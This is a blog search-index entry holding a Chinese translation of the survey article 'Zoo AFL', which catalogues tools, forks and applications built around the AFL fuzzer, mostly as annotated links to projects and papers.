<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AFL 及其相关拓展项目总结</title>
    <url>/2019/04/29/AFL%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E6%8B%93%E5%B1%95%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p><em>原文标题 Zoo AFL (Apr 24, 2019)</em></p>
<p>作者：<a href="https://habr.com/en/users/d1g1/">@d1g1</a></p>
<p>本文主要讨论的不是经典 AFL 本身，而是为其设计的工具以及对其本身做出的改进，我们认为这些改进可以显著提高模糊测试的质量。如果你想知道如何提高 AFL 效率以及如何更快地找到更多漏洞，请继续阅读！（持续更新中）</p>
<span id="more"></span>
<h1 id="AFL-是什么，它有什么用？"><a href="#AFL-是什么，它有什么用？" class="headerlink" title="AFL 是什么，它有什么用？"></a>AFL 是什么，它有什么用？</h1><p>AFL是一个覆盖导向或基于反馈的模糊测试工具，关于这些概念的更多信息可以在参考这篇论文 <a href="https://arxiv.org/abs/1812.00140">Fuzzing: Art, Science, and Engineering</a>。总结一下 AFL：</p>
<ul>
<li>它改进可执行文件以了解它如何影响覆盖范围</li>
<li>变异输入数据以最大化覆盖范围</li>
<li>重复上一步以找到程序崩溃的位置</li>
<li>通过实践证明它非常有效</li>
<li>它易于使用</li>
</ul>
<p>如果你不清楚 AFL 是什么的话，这里有一些资源帮助你上手和理解：</p>
<ul>
<li><a href="http://lcamtuf.coredump.cx/afl/">项目主页</a></li>
<li><a href="https://github.com/ThalesIgnite/afl-training">AFL 练习</a></li>
<li><a href="https://gitlab.com/wolframroesler/afl-demo">AFL Demo</a> — 使用 AFL fuzz C++ 程序</li>
<li><a href="https://github.com/mrash/afl-cve">AFL 发现的漏洞</a> —（截至 2017）</li>
<li>在<a href="https://tunnelshade.in/blog/2018/01/afl-internals-compile-time-instrumentation/">这里</a>你可以读到关于 AFL 在构建过程中添加到程序中的内容</li>
<li><a href="https://copyninja.info/blog/afl-and-network-programs.html">一些</a>关于 fuzz 网络程序的技巧</li>
</ul>
<p>在写这篇文章时 AFL 的最新版本是<a href="http://lcamtuf.coredump.cx/afl/">2.52b</a>。随着时间的推移，一些分支正在被纳入到 AFL 主分支。接下来我们会列举几个有用的附件工具。</p>
<p><strong>关于 Rode0day 竞赛</strong></p>
<p><a href="https://rode0day.mit.edu/">Rode0day</a> 竞赛每月举办一次，参赛者要在花费更少时间的情况下在预先制作的语料库（无论是否获取源代码）中找到最多的漏洞。就其本质而言，Rode0day 是 AFL 不同分支之间的争斗。</p>
<p>一些AFL用户<a href="https://groups.google.com/forum/#!topic/afl-users/6NTPAkK7JEk">指出</a>，AFL 的作者 Michal Zalewski 显然已经放弃该项目， 因为上次的改进日期还得追溯到 2017 年 11 月 5 日。这可能与他离开 Google 并开展一些新项目有关。 因此用户开始为最新的版本 2.52b 制作新的<a href="https://github.com/vanhauser-thc/afl-patches">补丁</a>)。</p>
<p>AFL 还有不同的变体和衍生物，允许模糊测试 Python，Go，Rust，OCaml，GCJ Java，内核系统调用，甚至整个虚拟机。</p>
<p><strong>AFL 对其它语言的支持</strong></p>
<ul>
<li><a href="https://github.com/jwilk/python-afl">python-afl</a> — Python</li>
<li><a href="https://github.com/rust-fuzz/afl.rs">afl.rs</a> — Rust</li>
<li><a href="https://github.com/connor4312/js-fuzz">afl-fuzz-js</a> — Javascript</li>
<li><a href="https://github.com/Barro/java-afl">java-afl</a> — Java</li>
<li><a href="https://github.com/isstac/kelinci">kelinci</a> — Java（<a href="https://www.modzero.ch/modlog/archives/2018/09/20/java_bugs_with_and_without_fuzzing/index.html">相关文章</a>）</li>
<li><a href="https://github.com/cretz/javan-warty-pig">javan-warty-pig</a> — JVM</li>
<li><a href="https://github.com/Proteas/afl-swift">afl-swift</a> — Swift</li>
<li><a href="https://github.com/kayceesrk/ocamlopt-afl">ocamlopt-afl</a> — OCaml</li>
<li><a href="https://github.com/Metalnem/sharpfuzz">sharpfuzz</a> — .Net</li>
</ul>
<h1 id="AFL-附属工具"><a href="#AFL-附属工具" class="headerlink" title="AFL 附属工具"></a>AFL 附属工具</h1><p>本节我们收集了 AFL 的各种脚本和工具，并将它们分为几类：</p>
<h2 id="崩溃处理"><a href="#崩溃处理" class="headerlink" title="崩溃处理"></a>崩溃处理</h2><ul>
<li><a href="https://gitlab.com/rc0r/afl-utils">afl-utils</a> — 自动处理/分析崩溃和减少测试用例数量</li>
<li><a href="https://github.com/floyd-fuh/afl-crash-analyzer">afl-crash-analyzer</a> — AFL 崩溃分析程序</li>
<li><a href="https://github.com/ThePatrickStar/fuzzer-utils">fuzzer-utils</a> — 分析结果</li>
<li><a href="https://github.com/Ayrx/atriage">atriage</a> — 简单的分类工具</li>
<li><a href="https://github.com/kcwu/afl-kit">afl-kit</a> — Python 实现的 afl-cmin</li>
<li><a href="https://github.com/d33tah/aflize">AFLize</a> — 生成适合 AFL 的 debian 包的构建</li>
<li><a href="https://github.com/FoRTE-Research/afl-fid">afl-fid</a> — 处理输入数据</li>
</ul>
<h2 id="代码覆盖率"><a href="#代码覆盖率" class="headerlink" title="代码覆盖率"></a>代码覆盖率</h2><ul>
<li><a href="https://github.com/mrash/afl-cov">afl-cov</a> — 提供人性化的覆盖率数据</li>
<li><a href="https://github.com/Barro/count-afl-calls">count-afl-calls</a> — 使用脚本计算二进制文件中的插桩块数，评估其占比</li>
<li><a href="https://github.com/bshastry/afl-sancov">afl-sancov</a> — 类似于 afl-cov 但使用 clang的消毒机制（sanitizer）</li>
<li><a href="https://github.com/Cisco-Talos/covnavi">covnavi</a> — 思科 Talos 开发的用于代码覆盖和分析的脚本</li>
<li><a href="https://gitlab.com/laf-intel/laf-llvm-pass/tree/master">LAF LLVM Passes</a> — 类似于 AFL 的补丁集合，可以改进代码使其更容易找到分支</li>
</ul>
<h2 id="一些用于最小化测试用例的脚本"><a href="#一些用于最小化测试用例的脚本" class="headerlink" title="一些用于最小化测试用例的脚本"></a>一些用于最小化测试用例的脚本</h2><ul>
<li><a href="https://github.com/ilsani/afl-pytmin">afl-pytmin</a> — 一个 afl-tmin 的包装器，它试图通过使用多 CPU 内核来加速最小化测试用例的过程</li>
<li><a href="https://github.com/MarkusTeufelberger/afl-ddmin-mod">afl-ddmin-mod</a> — 基于 ddmin 算法的 afl-tmin</li>
<li><a href="https://github.com/googleprojectzero/halfempty">halfempty</a> — 来自 Tavis Ormandy 基于并行化的快速最小化测试用例的程序</li>
</ul>
<h2 id="分布式执行"><a href="#分布式执行" class="headerlink" title="分布式执行"></a>分布式执行</h2><ul>
<li><a href="https://github.com/MartijnB/disfuzz-afl">disfuzz-afl</a> — AFL 的分布式模糊测试</li>
<li><a href="https://github.com/quantumvm/AFLDFF">AFLDFF</a> — AFL 分布式模糊测试框架</li>
<li><a href="https://github.com/bnagy/afl-launch">afl-launch</a> — AFL 多实例执行</li>
<li><a href="https://github.com/afl-mothership/afl-mothership">afl-mothership</a> — AWS 云上多同步 AFL 的管理和执行</li>
<li><a href="https://github.com/abhisek/afl-in-the-cloud">afl-in-the-cloud</a> — 另一个在 AWS 中运行 AFL 的脚本</li>
<li><a href="https://github.com/clvang000/VU_BSc_project">VU_BSc_project</a> — 使用 libFuzzer 和 AFL 对开源库进行模糊测试</li>
</ul>
<p>最近有一篇文章 <a href="https://gamozolabs.github.io/fuzzing/2018/09/16/scaling_afl.html">Scaling AFL to a 256 thread machine</a>。</p>
<h2 id="部署，管理，监控，报告"><a href="#部署，管理，监控，报告" class="headerlink" title="部署，管理，监控，报告"></a>部署，管理，监控，报告</h2><ul>
<li><a href="https://github.com/shellphish/afl-other-arch">afl-other-arch</a> — 用于添加对各种非x86体系结构的支持</li>
<li><a href="https://github.com/bnagy/afl-trivia">afl-trivia</a> — 简化 AFL 管理的脚本</li>
<li><a href="https://github.com/reflare/afl-monitor">afl-monitor</a> — AFL 监控脚本</li>
<li><a href="https://github.com/zx1340/afl-manager">afl-manager</a> — Python 实现的用于管理 multi-afl 的 Web 服务器</li>
<li><a href="https://hub.docker.com/r/moflow/afl-tools/">afl-tools</a> — 带有 afl-latest, afl-dyninst 和 Triforce-afl 的 docker 镜像</li>
<li><a href="https://github.com/block8437/afl-remote">afl-remote</a> — 远程管理 AFL 实例的 Web 服务器</li>
</ul>
<h2 id="包装器（wrapper）"><a href="#包装器（wrapper）" class="headerlink" title="包装器（wrapper）"></a>包装器（wrapper）</h2><ul>
<li><a href="https://github.com/angr/phuzzer">phuzzer</a> - 基于 Python 与 AFL 交互</li>
</ul>
<h1 id="AFL-改进"><a href="#AFL-改进" class="headerlink" title="AFL 改进"></a>AFL 改进</h1><p>AFL 对漏洞研究人员和模糊测试本身产生了巨大的影响，他们开始根据原始 AFL 进行改进。在不同的情况下，与原始AFL相比，每个改进都有其自身的优缺点。</p>
<p>几乎所有改进版本可以在 <a href="https://hub.docker.com">hub.docker.com</a> 找到。</p>
<p>目的是什么？</p>
<ul>
<li><p>提高速度并/或提高代码覆盖率</p>
<ul>
<li>算法</li>
<li>环境<ul>
<li>操作系统</li>
<li>硬件</li>
</ul>
</li>
</ul>
</li>
<li><p>无源码环境</p>
<ul>
<li>代码模拟</li>
<li>代码插桩<ul>
<li>静态</li>
<li>动态</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="AFL-默认模式"><a href="#AFL-默认模式" class="headerlink" title="AFL 默认模式"></a>AFL 默认模式</h2><p>在继续研究 AFL 的不同改进和分支之前，我们必须讨论两种重要的模式，这些模式在过去也有过改进但最终被合并。它们是 Syzygy 和 QEMU。</p>
<h3 id="Syzygy-模式-—-instrument-exe-中工作的模式"><a href="#Syzygy-模式-—-instrument-exe-中工作的模式" class="headerlink" title="Syzygy 模式 — instrument.exe 中工作的模式"></a><a href="https://doar-e.github.io/blog/2017/08/05/binary-rewriting-with-syzygy/">Syzygy</a> 模式 — instrument.exe 中工作的模式</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">instrument.exe <span class="attribute">--mode</span>=afl <span class="attribute">--input-image</span>=test.exe <span class="attribute">--output-image</span>=test.instr.exe</span><br></pre></td></tr></table></figure>
<p>Syzygy 允许使用 AFL 静态重写 PE32 二进制文件，但需要符号和额外环境的才能识别 WinAFL 内核。</p>
<h3 id="QEMU-模式-—-QEMU-下的工作方式见-Internals-of-AFL-fuzzer-—-QEMU-Instrumentation"><a href="#QEMU-模式-—-QEMU-下的工作方式见-Internals-of-AFL-fuzzer-—-QEMU-Instrumentation" class="headerlink" title="QEMU 模式 — QEMU 下的工作方式见 Internals of AFL fuzzer — QEMU Instrumentation"></a>QEMU 模式 — QEMU 下的工作方式见 <a href="https://tunnelshade.in/blog/2018/02/afl-internals-qemu-instrumentation/">Internals of AFL fuzzer — QEMU Instrumentation</a></h3><p>使用 QEMU 实现对二进制文件的支持在版本 1.31b 中被添加到 AFL 处理流程上游。AFL QEMU 模式使用 QEMU tcg（一个微小的代码生成器）二进制转换引擎的二进制插桩功能。为此，AFL 有一个 QEMU 的构建脚本，它提取特定版本 QEMU（2.10.0）的源代码，将它们放到几个小的补丁上，并为指定架构构建。然后，创建名为 afl-qemu-trace 的文件，该文件实际上是 QEMU 用户模式模拟（仅可执行ELF文件）的文件。因此，AFL 可以使用不同体系架构（QEMU 支持）中 elf 二进制文件的反馈进行模糊测试。此外，还有许多 AFL 工具，比如从显示器上获取有关当前会话的信息，以及 afl-analyze 等高级内容。但同时 AFL 也会受到 QEMU 的局限， 比如如果工具链使用硬件 SoC 功能构建文件（该功能启动二进制并且 QEMU 不支持），则只要有特定指令或使用特定 MMIO，模糊测试就会中断。</p>
<p><a href="https://abiondo.me/2018/09/21/improving-afl-qemu-mode/">这里</a>是 QEMU 模式的另一个有趣的分支，其中使用TCG代码插桩和缓存，速度提高了3-4倍。</p>
<h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><p>AFL 的分支首先与经典 AFL 算法的变化和改进有关。</p>
<ul>
<li><a href="https://github.com/wmliang/pe-afl">pe-afl</a> — 对在 Windows 操作系统中没有源代码的 PE 文件进行模糊测试的改进。fuzzer 使用 IDA Pro 分析目标程序，并生成用于接下来静态插桩的信息。然后用 AFL 对插桩后的程序进行模糊测试。</li>
<li><a href="https://github.com/arizvisa/afl-cygwin">afl-cygwin</a> — 尝试使用 Cygwin 将经典 AFL 移植到Windows。然而它有很多错误且很慢，作者已经放弃了开发</li>
<li><a href="https://github.com/mboehme/aflfast">AFLFast</a>（使用 Power Schedule 改进 AFL 的调度算法和搜索策略）— 最早的 AFL 分支之一，它增加了启发式功能，实现在短时间内找到更多路径。它在目标 binutils 上获得了比 AFL 高 1-2 个数量级的发现，在24小时内发现了原始 AFL 未能发现的 4 个 CVE，达到平均 19 倍的效率提升。Team Codejitsu 在美国国防部和 DARPA 组织的 CGC（基于人工智能的自动化漏洞挖掘大赛）上，使用 AFLFast 获得了漏洞发现数目单项挑战的亚军。</li>
<li><a href="https://github.com/carolemieux/afl-rb">FairFuzz</a> — AFL 的扩展，针对难抵达的分支（利用Branch Mask）</li>
<li><a href="https://github.com/aflgo/aflgo">AFLGo</a> — AFL 的扩展，获取代码的某些部分而不是完整的程序覆盖，可用于测试补丁或新添加的代码片段</li>
<li><a href="https://github.com/carolemieux/perffuzz">PerfFuzz</a> — AFL 的扩展，用于查找可能显着减慢程序速度的测试用例</li>
<li><a href="https://github.com/mboehme/pythia">Pythia</a> — AFL 的扩展，预测找到新路径的难度</li>
<li><a href="https://github.com/AngoraFuzzer/Angora">Angora</a> — 最新的 fuzzer 之一，用 Rust 语言编写，使用新的策略进行变异并增加覆盖范围。</li>
<li><a href="https://github.com/Dongdongshe/neuzz">Neuzz</a> — 用神经网络进行模糊测试</li>
<li><a href="https://github.com/FoRTE-Research/UnTracer-AFL">UnTracer-AFL</a> — 将 AFl 与 UnTracer 集成以进行有效跟踪</li>
<li><a href="https://github.com/sslab-gatech/qsym/">Qsym</a> — 针对混合模糊测试的实用混合执行（concolic execution）引擎。从本质上讲，它是一个符号执行引擎（基本组件作为 intel pin 的插件来实现），它与 AFL 一起执行混合模糊测试。这是基于反馈的模糊测试演变的一个阶段，需要单独讨论。它的主要优点是可以相对快速地进行混合执行。这是由于本机执行命令而没有代码、快照和一些启发式的中间表示。它使用旧版本的Intel pin（由于 libz3 和其他 DBT 之间的支持问题），目前支持ELF x86 和 x86_64 架构</li>
<li><a href="https://github.com/zhunki/Superion">Superion</a> — 灰盒模糊测试器，其优点是除了插桩程序外，它还使用 ANTLR 语法获取输入数据的规范，然后在此语法的帮助下执行变异</li>
<li><a href="https://github.com/aflsmart/aflsmart">AFLSmart</a> — 另一个灰盒模糊测试器，它以 Peach 使用的格式获得输入数据的规范</li>
</ul>
<p>有许多研究论文致力于实现 AFL 被改进的新方法和模糊测试技术。由于它们只有白皮书，所以我们甚至没有提到这些。如果你愿意，你可以搜索它们。例如最新的一些有 <a href="http://chao.100871.net/papers/oakland18.pdf">CollAFL: Path Sensitive Fuzzing</a>、<a href="https://arxiv.org/pdf/1807.00182.pdf">EnFuzz</a>、<a href="https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Dominiak-Efficient-Approach-to-Fuzzing-Interpreters-wp.pdf">Efficient approach to fuzzing interpreters</a>、<a href="https://arxiv.org/pdf/1811.08973.pdf">ML</a> 用于 AFL 等。</p>
<h2 id="基于-QEMU-的改进"><a href="#基于-QEMU-的改进" class="headerlink" title="基于 QEMU 的改进"></a>基于 QEMU 的改进</h2><ul>
<li><a href="https://github.com/nccgroup/TriforceAFL">TriforceAFL</a> — AFL/QEMU对系统完全模拟来进行模糊测试。是由 nccgroup 提供的一个分支。它允许在 QEMU 模式下对整个操作系统进行模糊测试。它是通过一个特殊指令（aflCall (0f 24)）（在 QEMU x64 CPU 中添加）实现的。然而它不再受支持; 支持 AFL 的最后一个版本是2.06b</li>
<li><a href="https://github.com/nccgroup/TriforceLinuxSyscallFuzzer">TriforceLinuxSyscallFuzzer</a> — Linux 系统调用的模糊测试</li>
<li><a href="https://github.com/kanglictf/afl-qai">afl-qai</a> — 一个带有 QEMU 增强插桩（qai）的小型演示项目。</li>
</ul>
<h2 id="基于-KLEE-的改进"><a href="#基于-KLEE-的改进" class="headerlink" title="基于 KLEE 的改进"></a>基于 KLEE 的改进</h2><ul>
<li><a href="https://github.com/julieeen/kleefl">kleefl</a> — 通过符号执行生成测试用例（在大程序上非常慢）</li>
</ul>
<h2 id="基于-Angr-的改进"><a href="#基于-Angr-的改进" class="headerlink" title="基于 Angr 的改进"></a>基于 Angr 的改进</h2><ul>
<li><a href="https://github.com/shellphish/driller">Driller</a> - 将 AFL 和 Angr 结合在一起，还被用于 CGC(Cyber Grand Challenge) 自动网络攻防竞赛上</li>
</ul>
<h2 id="基于-Unicorn-的改进"><a href="#基于-Unicorn-的改进" class="headerlink" title="基于 Unicorn 的改进"></a>基于 Unicorn 的改进</h2><ul>
<li><a href="https://github.com/Battelle/afl-unicorn">afl-unicorn</a> — 允许通过在 <a href="https://www.unicorn-engine.org/">Unicorn Engine</a> 上模拟代码片段进行模糊测试</li>
</ul>
<p>我们在实践中成功使用了 AFL 的这种改进，由于目标是在 SOC 上执行的某个 RTOS（real-time operating system，实时操作系统）的代码区域，因此我们无法使用QEMU模式。在我们没有源代码的情况下（我们无法构建用于解析器分析的独立二进制文件）并且程序不直接获取输入数据（例如，数据被加密或是如在 CGC 二进制文件中的信号样本），然后我们可以逆向并找到所谓的位置函数，函数中中数据以便于模糊测试器使用的格式进行处理。这是 AFL 最普遍/通用的修改，即它允许模糊测试任何东西。它独立于架构、源、输入数据格式和二进制格式（例如裸机，只是来自控制器内存的代码片段）。研究人员首先检查这个二进制文件并编写一个模糊测试器，它在解析过程的输入端模拟状态。显然与 AFL 不同，这需要对二进制进行一定的检查。对于裸机固件，如 Wi-FI 或基带，我们需要记住一些缺点：</p>
<ul>
<li>我们必须本地处理控制和的检查</li>
<li>模糊测试器的状态是保存在内存转储中的内存状态，这可以防止模糊测试器进入某些路径</li>
<li>动态内存调用没有消毒，但它可以手动实现，它将取决于 RTOS（必须进行研究）</li>
<li>未模拟任务内 RTOS 交互，这也可能阻止寻找某些路径</li>
</ul>
<p>使用这种修改的例子有：</p>
<p><a href="https://hackernoon.com/afl-unicorn-fuzzing-arbitrary-binary-code-563ca28936bf">afl-unicorn: Fuzzing Arbitrary Binary Code</a></p>
<p><a href="https://hackernoon.com/afl-unicorn-part-2-fuzzing-the-unfuzzable-bea8de3540a5">afl-unicorn: Part 2 — Fuzzing the ‘Unfuzzable’</a></p>
<p><a href="https://github.com/fgsect/unicorefuzz">unicorefuzz</a> 使用 afl-unicorn 来 fuzz 内核</p>
<p>在我们继续基于动态二进制检测（DBI）框架进行修改之前，不要忘记这些框架的最快速度由 DynamoRIO，Dynlnst 以及 PIN 实现。</p>
<h2 id="基于-PIN-的改进"><a href="#基于-PIN-的改进" class="headerlink" title="基于 PIN 的改进"></a>基于 PIN 的改进</h2><ul>
<li><a href="https://github.com/mothran/aflpin">aflpin</a> — 采用 Intel PIN 插桩的 AFL</li>
<li><a href="https://github.com/spinpx/afl_pin_mode">afl_pin_mode</a> — 另一个采用 Intel PIN 插桩的 AFL</li>
<li><a href="https://github.com/vanhauser-thc/afl-pin">afl-pin</a> — 采用 PINtool 的 AFL</li>
<li><a href="https://github.com/carlosgprado/NaFl">NaFl</a> — AFL 模糊测试器的克隆（基本核心）</li>
<li><a href="https://github.com/houcy/PinAFL">PinAFL</a> — 该工具的作者试图将 AFL 移植到 Windows，以便对已编译的二进制文件进行模糊测试。该项目好像是为了好玩而在一夜之间完成的且未进一步发展。存储库里没有源文件，只有已编译的二进制文件和启动指令。我们不知道它基于哪个版本的 AFL，它只支持 32 位应用程序。</li>
</ul>
<p>正如我们所看到的，AFL 有许多不同的修改，但它们在现实生活中并不是非常有用。</p>
<h2 id="基于-Dyninst-的改进"><a href="#基于-Dyninst-的改进" class="headerlink" title="基于 Dyninst 的改进"></a>基于 Dyninst 的改进</h2><p><a href="https://github.com/talos-vulndev/afl-dyninst">afl-dyninst</a> — AFL + Dyninst == AFL 黑盒模糊测试。这个版本的特点是首先使用 Dyninst 对一个研究过的程序（没有源代码）进行静态插桩（静态二进制插桩，静态二进制重写），然后使用经典 AFL 进行模糊测试，AFL 会认为程序是用 afl-gcc/afl-g++/afl-as 构建的。因此，它在没有源代码的情况下以非常好的生产率工作：与本地编译相比，经典 AFL 是 0.25 倍的速度。与QEMU相比，它具有显着优势：它允许动态链接库的插桩，而 QEMU 只能插桩与库静态链接的基本可执行文件。然而现在它只支持 Linux，如果增加对于 Windows 支持，则需要对 Dyninst 本身进行更改，这个工作<a href="https://github.com/dyninst/dyninst/issues/120">正在进行</a>中。</p>
<p>还有另一个<a href="https://github.com/vanhauser-thc/afl-dyninst">分支</a>具有提升的速度和某些功能（AARCH64 和 PPC 架构的支持）。</p>
<h2 id="基于-DynamoRIO-的改进"><a href="#基于-DynamoRIO-的改进" class="headerlink" title="基于 DynamoRIO 的改进"></a>基于 DynamoRIO 的改进</h2><ul>
<li><a href="https://github.com/mxmssh/drAFL">drAFL</a> — AFl + DynamoRIO – 在 Linux 上没有源代码的模糊测试</li>
<li><a href="https://github.com/atrosinenko/afl-dr">afl-dr</a> — 基于 DynamoRIO 的另一种实现，在 <a href="https://habrahabr.ru/post/332076/">Habr</a> 上有很好的描述</li>
<li><a href="https://github.com/vanhauser-thc/afl-dynamorio">afl-dynamorio</a> — 来自 vanhauser-thc 的修改。 据他所说：“当正常的 afl-dyninst 能够使二进制崩溃并且 QEMU 模式 -Q 无法执行时，用 DynamoRIO 运行 AFL。”它支持 ARM 和 AARCH64。DynamoRIO 比 QEMU 慢大约 10 倍，比 dyninst 慢 25 倍，但比 Pintool 快 10 倍。</li>
<li><a href="https://github.com/ivanfratric/winafl">WinAFL</a> — 最著名的 AFL分支。（DynamoRIO，也是 syzygy 模式）。这个修改的出现只是时间问题，因为许多人想在 Windows 上尝试 AFL 并将其应用于没有源代码的应用程序。目前，这个工具正在被积极改进，尽管 AFL 代码库（撰写本文时为 2.43b）相对过时，但它都有助于发现多个漏洞（CVE-2016-7212，CVE-2017-0073，CVE- 2017-0190，CVE-2017-11816）。Google Zero Project 团队和 MSRC 漏洞与解决团队的专家正在参与此项目，因此我们希望它能够得到进一步的发展。开发人员使用动态插桩（基于DynamoRIO）而不是编译时插桩，这显着减慢了被分析软件的执行速度，但产生的开销（加倍）与二进制模式下的经典 AFL 相当。他们还解决了快速启动过程的问题，称其为持续模糊测试模式；他们选择对函数进行模糊测试（通过文件内部的偏移或导出表中存在的函数名称）并对其进行插桩，以便可以在循环中调用它，从而启动多个输入数据样本而无需重新启动程序。最近发表的一篇<a href="https://research.checkpoint.com/50-adobe-cves-in-50-days/">文章</a>描述了作者如何使用 WinAFL 在约 50 天内发现约 50 个漏洞。发布之后很快 WinAFL 就支持 Intel PT（Processor Tracing，处理器跟踪）模式，在这里可以找到<a href="https://github.com/googleprojectzero/winafl/blob/master/readme_pt.md">细节信息</a>。</li>
</ul>
<p>专业读者可能注意到这些改进使用了除了Frida之外的各种流行的插桩框架。 唯一提到 Frida 与 AFL 的结合使用是在 <a href="http://wpage.unina.it/roberto.natella/papers/natella_androidfuzzing_issre2017.pdf">Chizpurfle: A Gray-Box Android Fuzzer for Vendor Service Customizations</a> 中找到的。 带 Frida 的 AFL 版本非常有用，因为 Frida 支持多种 RISC 架构。</p>
<p>许多研究者也期待由 Capstone，Unicorn 和 Keystone 的创建者发布的 DBI Scopio 框架。基于这个框架，作者已经创建了一个模糊测试器（Darko），据他们说能够成功地使用它来对嵌入式设备进行模糊测试。有关这方面的更多信息，请参阅 <a href="https://conference.hitb.org/hitbsecconf2018pek/materials/D2T1%20-%20Finding%200days%20in%20Embedded%20Systems%20with%20Code%20Coverage%20Guided%20Fuzzing%20-%20Dr%20Quynh%20and%20Kai%20Jern%20Lau.pdf">Digging Deep: Finding 0days in Embedded Systems with Code Coverage Guided Fuzzing</a>。</p>
<h2 id="基于处理器硬件特征的改进"><a href="#基于处理器硬件特征的改进" class="headerlink" title="基于处理器硬件特征的改进"></a>基于处理器硬件特征的改进</h2><p>关于支持处理器硬件功能的 AFL 修改方面，首先，它允许对内核代码进行模糊测试；其次，它允许在没有源代码的情况下更快地对应用程序进行模糊测试。</p>
<p>当然，谈到处理器硬件功能，我们最感兴趣的是 <a href="https://software.intel.com/en-us/node/721535">Intel PT</a>。从第 6 代处理器开始（大约自2015年起）支持该功能。 因此，为了能够使用下面列出的模糊测试器，我们需要一个支持 Intel PT 的处理器。</p>
<ul>
<li><a href="https://github.com/intelpt/winafl-intelpt">WinAFL-IntelPT</a> — 使用 Intel PT 而不是 DynamoRIO 的第三方 WinAFL。</li>
<li><a href="https://github.com/hunter-ht-2018/ptfuzzer">ptfuzzer</a> - 使用 Intel PT 对二进制进行黑盒测试。</li>
<li><a href="https://github.com/RUB-SysSec/kAFL">kAFL</a> — 一个旨在解决独立于操作系统的模糊测试内核时的覆盖率导向问题的学术项目。 它通过使用管理程序（hypervisor）和 Intel PT 来解决该问题。有关它的更多信息可以在白皮书 <a href="https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-schumilo.pdf">kAFL: Hardware-Assisted Feedback Fuzzing for OS Kernels</a> 中找到。</li>
</ul>
<h1 id="AFL-具体应用"><a href="#AFL-具体应用" class="headerlink" title="AFL 具体应用"></a>AFL 具体应用</h1><ul>
<li><a href="https://github.com/airbus-seclab/gustave">GUSTAVE</a> - 一个嵌入式操作系统内核的 Fuzzer，基于 QEMU 和 AFL。</li>
<li><a href="https://github.com/ele7enxxh/android-afl">android-afl</a> - 在 Android 上使用 AFL。<a href="https://paper.seebug.org/245/">在Linux上使用AFL对Stagefright进行模糊测试</a></li>
<li>使用 AFL 对嵌入式系统的 TEE 进行模糊测试。<a href="https://nullcon.net/website/archives/pdf/bangalore-2019/fuzzing-embedded-(trusted">PDF</a>-operating-systems%20using-AFL.pdf) <a href="https://youtu.be/AZhxZlwZ160">YOUTUBE</a></li>
<li><a href="https://github.com/sslab-gatech/janus">Janus</a> - 基于 AFL 和 Syzkaller 对 linux 的文件系统进行模糊测试， 支持 8 种文件系统 ext4、XFS、btrfs、F2FS、GFS2、HFS+、ReiserFS 和 vFAT；以及 34 个文件操作的系统调用。</li>
<li>利用 AFL 模糊测试 <a href="https://github.com/fcambus/statzone">statzone</a>。<a href="https://www.cambus.net/fuzzing-dns-zone-parsers/">地址</a></li>
<li>利用 AFL 模糊测试 Linux 内核。<a href="https://blog.cloudflare.com/a-gentle-introduction-to-linux-kernel-fuzzing/">地址</a></li>
<li><a href="https://github.com/zyw-200/FirmAFL">FIRM-AFL</a> - 基于 AFL 实现的用于 IoT 固件灰盒模糊测试的工具。<a href="https://www.cs.ucr.edu/~heng/pubs/FirmAFL.pdf">PDF</a></li>
<li>对 OP-TEE 的系统调用接口进行模糊测试。<a href="https://github.com/Riscure/optee_fuzzer">地址</a></li>
<li>利用 WinAFL 对二进制程序进行模糊测试，利用内存访问热图来精简输入种子大小。<a href="https://sec-consult.com/en/blog/2017/09/hack-the-hacker-fuzzing-mimikatz-on-windows-with-winafl-heatmaps-0day/">地址</a></li>
<li><a href="https://github.com/rohanpadhye/FuzzFactory">FuzzFactory</a> - AFL 扩展，使用 Waypoints 针对特定领域进行通用的以覆盖率位导向的模糊测试。<a href="https://www.youtube.com/watch?v=34A1jtgfgsU">YOUTUBE</a> <a href="https://dl.acm.org/citation.cfm?doid=3366395.3360600">Paper</a></li>
<li><a href="https://www.petergoodman.me/docs/qpss-2019-slides.pdf">PowerFL</a> - PowerFL = AFL + QEMU + VxWorks，使用 AFL 和 QEMU 对 PowerPC 和 Intel i386 VxWorks 进行 fuzz。</li>
<li><a href="https://github.com/andreafioraldi/frida-js-afl-instr">frida-js-afl-instr</a> - 使用 <a href="https://github.com/vanhauser-thc/AFLplusplus">AFL++</a> 和 Frida 进行 Linux 内存中的模糊测试。</li>
<li><a href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning">libprotobuf-mutator_fuzzing_learning</a> - 将 AFL++ 和 LibFuzzer 结合使用（通过protobuf）。</li>
<li><a href="https://github.com/aflnet/aflnet">AFLNet</a> - 面向网络协议的<strong>状态</strong>灰盒 Fuzzer，以 Server 和 Client 之间正常的协议通信数据（tcpdump 监听端口并用 Wireshark 做进一步处理）作为语料，不需要知道协议具体数据格式和语法。</li>
<li><a href="https://www.secpulse.com/archives/71903.html">fuzz实战之afl</a> - 利用 AFL fuzz 网络程序 libmodbus 库，利用 <a href="https://github.com/zardus/preeny">preeny</a> <code>LD_PRELOAD</code> 把从 socket 获取数据，转变为从 stdin 获取数据。</li>
<li><a href="https://securitylab.github.com/research/fuzzing-sockets-FTP">Fuzzing sockets, part 1: FTP servers</a> - 利用 AFL++ fuzz FTP 服务器（命令），作者详细介绍如何改写 FTP 服务器源码来支持 fuzz（工程量大，修改约 1500 行代码），并介绍了<code>CVE-2020-9273</code>，<code>CVE-2020-9365</code>和<code>CVE-2020-9274</code>的原理。</li>
</ul>
<h1 id="AFL-原理与实现"><a href="#AFL-原理与实现" class="headerlink" title="AFL 原理与实现"></a>AFL 原理与实现</h1><ul>
<li><a href="https://paper.seebug.org/496/">AFL(American Fuzzy Lop)实现细节与文件变异</a></li>
<li><a href="https://bbs.pediy.com/thread-254705.htm">AFL afl_fuzz.c 详细分析</a></li>
<li><a href="https://paper.seebug.org/841/">AFL 漏洞挖掘技术漫谈（一）：用 AFL 开始你的第一次 Fuzzing</a></li>
